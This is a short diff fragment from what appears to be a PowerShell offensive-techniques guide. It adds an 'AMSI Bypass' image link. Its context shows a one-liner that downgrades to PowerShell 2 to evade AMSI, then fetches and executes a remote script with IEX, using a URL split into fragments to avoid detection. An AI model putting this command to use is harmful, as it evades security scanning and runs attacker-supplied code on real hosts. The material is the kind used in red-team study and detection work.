@@ -843,6 +843,8 @@ Here we can view the all process of encoding/decoding in powershell console
 
 <br />
 
+![AMSI Bypass](http://i67.tinypic.com/1z6w1s2.jpg)
+
 - Oneliner AMSI bypass<br />
 
       powershell.exe -version 2 IEX (New-Object Net.WebClient).DownloadString('ht'+'tp:'+'//19'+'2.16'+'8.1.71/hello.ps1')
